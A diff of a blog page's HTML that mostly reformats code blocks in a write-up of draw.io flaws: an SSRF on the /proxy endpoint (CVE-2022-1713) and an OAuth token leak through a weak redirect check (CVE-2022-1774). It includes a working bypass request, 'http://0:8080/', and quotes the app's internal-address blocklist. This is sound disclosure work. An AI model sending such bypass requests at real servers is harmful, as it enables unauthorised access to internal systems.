@@ -3,12 +3,14 @@
 <style>
 
 		@font-face { font-family: "gohu"; src: url("/gohu.woff") format('woff'); }
+		html {
+			background: url('/4rt3/g3n3r4t1v3/sketch_220308a/out.gif') no-repeat center/100% fixed;
+		}
 		body {
 			font-family: 'gohu', monospace;
 			max-width: 50em;
 			margin: 0 auto;
 			color: white;
-			background: black;
 			line-height: calc(1ex / 0.32);
 			margin-top: 3em;
 		}
@@ -85,125 +87,125 @@
 <p>First things first, cloned the repository and ran it locally. Altho it's possible to rely on only reading the code, being able to debug/log the application is really a game changer. I couldn't make any debugging work for Java and Visual Code so I just stuck with good old <code>System.out.println</code>, but debugging is always preferable. I also don't use, but probably should, any fancy tooling like <a href="https://github.com/returntocorp/semgrep">Semgrep</a> or a more complex IDE like <a href="https://code.visualstudio.com/">Visual Code</a>, only <a href="https://www.sublimetext.com/">Sublime Text</a> and reading the outputs on the terminal, I'm an old school outdated guy, I know.</p>
 <p>The source has two main parts <code>src/main/java</code> for the Back-end code and <code>src/main/webapp</code> for the Front-end. As I was trying to find the more critical vulnerabilities, I only looked at the Back-end part of the application. The server side is really small compared to the front-end but it has some interesting features. Two parts caught my attention, the <code>*AuthServelet.java</code> files that are responsible for the third-party authentication process, and the <code>ProxyServlet.java</code> that looks like it receives a URL and does something with it.</p>
 <p>At this point, I didn't touch the running application but had to find where inside of it those classes are being used. We can see the endpoints and their classes on <code>src/main/webapp/WEB-INF/web.xml</code></p>
-<div class="codehilite"><pre><span></span><code><span class="nt">&lt;servlet&gt;</span>
-<span class="w">    </span><span class="nt">&lt;description/&gt;</span>
-<span class="w">    </span><span class="nt">&lt;display-name&gt;</span>ProxyServlet<span class="nt">&lt;/display-name&gt;</span>
-<span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>ProxyServlet<span class="nt">&lt;/servlet-name&gt;</span>
-<span class="w">    </span><span class="nt">&lt;servlet-class&gt;</span>com.mxgraph.online.ProxyServlet<span class="nt">&lt;/servlet-class&gt;</span>
-<span class="w">  </span><span class="nt">&lt;/servlet&gt;</span>
-<span class="w">  </span><span class="nt">&lt;servlet-mapping&gt;</span>
-<span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>ProxyServlet<span class="nt">&lt;/servlet-name&gt;</span>
-<span class="w">    </span><span class="nt">&lt;url-pattern&gt;</span>/proxy<span class="nt">&lt;/url-pattern&gt;</span>
-<span class="w">  </span><span class="nt">&lt;/servlet-mapping&gt;</span>
+<pre class="codehilite"><code class="language-xml">&lt;servlet&gt;
+    &lt;description/&gt;
+    &lt;display-name&gt;ProxyServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;ProxyServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.mxgraph.online.ProxyServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;ProxyServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/proxy&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
 [...]
-<span class="w">  </span><span class="nt">&lt;servlet&gt;</span>
-<span class="w">    </span><span class="nt">&lt;description/&gt;</span>
-<span class="w">    </span><span class="nt">&lt;display-name&gt;</span>GitHubAuthServlet<span class="nt">&lt;/display-name&gt;</span>
-<span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>GitHubAuthServlet<span class="nt">&lt;/servlet-name&gt;</span>
-<span class="w">    </span><span class="nt">&lt;servlet-class&gt;</span>com.mxgraph.online.GitHubAuthServlet<span class="nt">&lt;/servlet-class&gt;</span>
-<span class="w">  </span><span class="nt">&lt;/servlet&gt;</span>
-<span class="w">  </span><span class="nt">&lt;servlet-mapping&gt;</span>
-<span class="w">    </span><span class="nt">&lt;servlet-name&gt;</span>GitHubAuthServlet<span class="nt">&lt;/servlet-name&gt;</span>
-<span class="w">    </span><span class="nt">&lt;url-pattern&gt;</span>/github2<span class="nt">&lt;/url-pattern&gt;</span>
-<span class="w">  </span><span class="nt">&lt;/servlet-mapping&gt;</span>
-</code></pre></div>
+  &lt;servlet&gt;
+    &lt;description/&gt;
+    &lt;display-name&gt;GitHubAuthServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;GitHubAuthServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.mxgraph.online.GitHubAuthServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;GitHubAuthServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/github2&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+</code></pre>
 
 <h2>SSRF on /proxy - CVE-2022-1713</h2>
 <p><code>src/main/java/ProxyServlet.java</code></p>
-<div class="codehilite"><pre><span></span><code><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span>
-<span class="w">        </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span>
-<span class="p">{</span>
-<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">urlParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&quot;url&quot;</span><span class="p">);</span>
+<pre class="codehilite"><code class="language-java">protected void doGet(HttpServletRequest request,
+        HttpServletResponse response) throws ServletException, IOException
+{
+    String urlParam = request.getParameter(&quot;url&quot;);
 
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">checkUrlParameter</span><span class="p">(</span><span class="n">urlParam</span><span class="p">))</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">        </span><span class="c1">// build the UML source from the compressed request parameter</span>
-<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&quot;referer&quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">ua</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&quot;User-Agent&quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&quot;Authorization&quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">dom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getCorsDomain</span><span class="p">(</span><span class="n">ref</span><span class="p">,</span><span class="w"> </span><span class="n">ua</span><span class="p">);</span>
+    if (checkUrlParameter(urlParam))
+    {
+        // build the UML source from the compressed request parameter
+        String ref = request.getHeader(&quot;referer&quot;);
+        String ua = request.getHeader(&quot;User-Agent&quot;);
+        String auth = request.getHeader(&quot;Authorization&quot;);
+        String dom = getCorsDomain(ref, ua);
 
-<span class="w">        </span><span class="k">try</span><span class="p">(</span><span class="n">OutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">())</span>
-<span class="w">        </span><span class="p">{</span>
-<span class="w">            </span><span class="n">request</span><span class="p">.</span><span class="na">setCharacterEncoding</span><span class="p">(</span><span class="s">&quot;UTF-8&quot;</span><span class="p">);</span>
-<span class="w">            </span><span class="n">response</span><span class="p">.</span><span class="na">setCharacterEncoding</span><span class="p">(</span><span class="s">&quot;UTF-8&quot;</span><span class="p">);</span>
+        try(OutputStream out = response.getOutputStream())
+        {
+            request.setCharacterEncoding(&quot;UTF-8&quot;);
+            response.setCharacterEncoding(&quot;UTF-8&quot;);
 
-<span class="w">            </span><span class="n">URL</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="n">urlParam</span><span class="p">);</span>
-<span class="w">            </span><span class="n">URLConnection</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="na">openConnection</span><span class="p">();</span>
-<span class="w">            </span><span class="n">connection</span><span class="p">.</span><span class="na">setConnectTimeout</span><span class="p">(</span><span class="n">TIMEOUT</span><span class="p">);</span>
-<span class="w">            </span><span class="n">connection</span><span class="p">.</span><span class="na">setReadTimeout</span><span class="p">(</span><span class="n">TIMEOUT</span><span class="p">);</span>
+            URL url = new URL(urlParam);
+            URLConnection connection = url.openConnection();
+            connection.setConnectTimeout(TIMEOUT);
+            connection.setReadTimeout(TIMEOUT);
 
-<span class="w">            </span><span class="n">response</span><span class="p">.</span><span class="na">setHeader</span><span class="p">(</span><span class="s">&quot;Cache-Control&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;private, max-age=86400&quot;</span><span class="p">);</span>
-</code></pre></div>
+            response.setHeader(&quot;Cache-Control&quot;, &quot;private, max-age=86400&quot;);
+</code></pre>
 
 <p>It's pretty clear that the endpoint receives an <code>url</code> parameter and does some checking with <code>checkUrlParameter(urlParam)</code> to see if will allow a request to be made. Let's check the function.</p>
-<div class="codehilite"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">checkUrlParameter</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="p">)</span>
-<span class="w"> </span><span class="p">{</span>
-<span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">url</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span>
-<span class="w"> </span><span class="p">{</span>
-<span class="w"> </span><span class="k">try</span>
-<span class="w">  </span><span class="p">{</span>
-<span class="w">   </span><span class="n">URL</span><span class="w"> </span><span class="n">parsedUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="n">url</span><span class="p">);</span>
-<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parsedUrl</span><span class="p">.</span><span class="na">getProtocol</span><span class="p">();</span>
-<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parsedUrl</span><span class="p">.</span><span class="na">getHost</span><span class="p">().</span><span class="na">toLowerCase</span><span class="p">();</span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">protocol</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;http&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">protocol</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;https&quot;</span><span class="p">))</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">endsWith</span><span class="p">(</span><span class="s">&quot;.internal&quot;</span><span class="p">)</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">endsWith</span><span class="p">(</span><span class="s">&quot;.local&quot;</span><span class="p">)</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;localhost&quot;</span><span class="p">)</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;0.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 0.0.0.0/8</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;10.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 10.0.0.0/8</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;127.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 127.0.0.0/8</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;169.254.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 169.254.0.0/16</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.16.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.17.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.18.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.19.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.20.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.21.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.22.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.23.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.24.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.25.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.26.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.27.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.28.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.29.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.30.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;172.31.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 172.16.0.0/12</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;192.0.0.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 192.0.0.0/24</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;192.168.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 192.168.0.0/16</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;198.18.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 198.18.0.0/15</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;198.19.&quot;</span><span class="p">)</span><span class="w"> </span><span class="c1">// 198.18.0.0/15</span>
-<span class="w">     </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">host</span><span class="p">.</span><span class="na">endsWith</span><span class="p">(</span><span class="s">&quot;.arpa&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// reverse domain (needed?)</span>
-<span class="w">   </span><span class="p">}</span>
-<span class="w">   </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">MalformedURLException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span>
-<span class="w">   </span><span class="p">{</span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
-<span class="w">   </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="w">  </span><span class="k">else</span>
-<span class="w">  </span><span class="p">{</span>
-<span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="w"> </span><span class="p">}</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-java">public boolean checkUrlParameter(String url)
+ {
+ if (url != null)
+ {
+ try
+  {
+   URL parsedUrl = new URL(url);
+  String protocol = parsedUrl.getProtocol();
+    String host = parsedUrl.getHost().toLowerCase();
+    return (protocol.equals(&quot;http&quot;) || protocol.equals(&quot;https&quot;))
+     &amp;&amp; !host.endsWith(&quot;.internal&quot;)
+     &amp;&amp; !host.endsWith(&quot;.local&quot;)
+     &amp;&amp; !host.contains(&quot;localhost&quot;)
+     &amp;&amp; !host.startsWith(&quot;0.&quot;) // 0.0.0.0/8
+     &amp;&amp; !host.startsWith(&quot;10.&quot;) // 10.0.0.0/8
+     &amp;&amp; !host.startsWith(&quot;127.&quot;) // 127.0.0.0/8
+     &amp;&amp; !host.startsWith(&quot;169.254.&quot;) // 169.254.0.0/16
+     &amp;&amp; !host.startsWith(&quot;172.16.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.17.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.18.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.19.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.20.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.21.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.22.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.23.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.24.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.25.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.26.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.27.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.28.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.29.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.30.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;172.31.&quot;) // 172.16.0.0/12
+     &amp;&amp; !host.startsWith(&quot;192.0.0.&quot;) // 192.0.0.0/24
+     &amp;&amp; !host.startsWith(&quot;192.168.&quot;) // 192.168.0.0/16
+     &amp;&amp; !host.startsWith(&quot;198.18.&quot;) // 198.18.0.0/15
+     &amp;&amp; !host.startsWith(&quot;198.19.&quot;) // 198.18.0.0/15
+     &amp;&amp; !host.endsWith(&quot;.arpa&quot;); // reverse domain (needed?)
+   }
+   catch (MalformedURLException e)
+   {
+    return false;
+   }
+  }
+  else
+  {
+   return false;
+  }
+ }
+</code></pre>
 
 <p>The function does a series of checking to assure that the url is not internal, and of course this has a LOT of bypasses. I went with the simple <code>http://0:8080/</code> , see more at https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/proxy?url=http%3a//0:8080/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="na">Host</span><span class="o">:</span> <span class="l">127.0.0.1:8080</span>
-<span class="na">sec-ch-ua</span><span class="o">:</span> <span class="l">&quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;101&quot;</span>
-<span class="na">sec-ch-ua-mobile</span><span class="o">:</span> <span class="l">?0</span>
-<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36</span>
-<span class="na">sec-ch-ua-platform</span><span class="o">:</span> <span class="l">&quot;macOS&quot;</span>
-<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
-<span class="na">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
-<span class="na">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">cors</span>
-<span class="na">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">empty</span>
-<span class="na">Referer</span><span class="o">:</span> <span class="l">http://127.0.0.1:8080/?mode=device&amp;title=Untitled%20Diagram.drawio.xml&amp;create=https%3A%2F%2Fxcd8bz39zlnis2ngq84j05tt7kda1z.oastify.com%2F&amp;sync=manual&amp;db=0&amp;gh=0&amp;tr=0&amp;gapi=0&amp;od=0&amp;gl=0</span>
-<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
-<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7</span>
-<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-http">GET /proxy?url=http%3a//0:8080/ HTTP/1.1
+Host: 127.0.0.1:8080
+sec-ch-ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;101&quot;
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+sec-ch-ua-platform: &quot;macOS&quot;
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1:8080/?mode=device&amp;title=Untitled%20Diagram.drawio.xml&amp;create=https%3A%2F%2Fxcd8bz39zlnis2ngq84j05tt7kda1z.oastify.com%2F&amp;sync=manual&amp;db=0&amp;gh=0&amp;tr=0&amp;gapi=0&amp;od=0&amp;gl=0
+Accept-Encoding: gzip, deflate
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+</code></pre>
 
 <p>Not much to add here, just a simple SSRF bypass.</p>
 <h2>Leakage of third-party OAuth token - CVE-2022-1774</h2>
@@ -222,95 +224,95 @@
 <p>So if we redirect the user to our site, the <code>access_token</code> will be forwarded and leaked. With the <code>access_token</code> we can perform actions as the application on the Github API.
 So let's check how the URL from <code>redirect</code> is checked.</p>
 <p><code>drawio/src/main/java/com/mxgraph/online/AbsAuthServlet.java</code></p>
-<div class="codehilite"><pre><span></span><code><span class="n">domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stateVars</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;domain&quot;</span><span class="p">);</span>
-<span class="n">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stateVars</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;cId&quot;</span><span class="p">);</span>
-<span class="n">stateToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stateVars</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;token&quot;</span><span class="p">);</span>
-<span class="n">version</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stateVars</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;ver&quot;</span><span class="p">);</span>
-<span class="n">successRedirect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stateVars</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;redirect&quot;</span><span class="p">);</span>
+<pre class="codehilite"><code class="language-java">domain = stateVars.get(&quot;domain&quot;);
+client = stateVars.get(&quot;cId&quot;);
+stateToken = stateVars.get(&quot;token&quot;);
+version = stateVars.get(&quot;ver&quot;);
+successRedirect = stateVars.get(&quot;redirect&quot;);
 
-<span class="c1">//Redirect to a page on the same domain only (relative path)</span>
-<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">successRedirect</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">isAbsolute</span><span class="p">(</span><span class="n">successRedirect</span><span class="p">))</span>
-<span class="p">{</span>
-<span class="w">    </span><span class="n">successRedirect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="o">[</span><span class="p">...</span><span class="o">]</span>
+//Redirect to a page on the same domain only (relative path)
+if (successRedirect != null &amp;&amp; isAbsolute(successRedirect))
+{
+    successRedirect = null;
+}
+[...]
 
-<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">isAbsolute</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="p">)</span>
-<span class="p">{</span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;//&quot;</span><span class="p">))</span><span class="w">  </span><span class="c1">// //www.domain.com/start</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
+public static boolean isAbsolute(String url)
+{
+    if (url.startsWith(&quot;//&quot;))  // //www.domain.com/start
+    {
+        return true;
+    }
 
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">))</span><span class="w"> </span><span class="c1">// /somePage.html</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
+    if (url.startsWith(&quot;/&quot;)) // /somePage.html
+    {
+        return false;
+    }
 
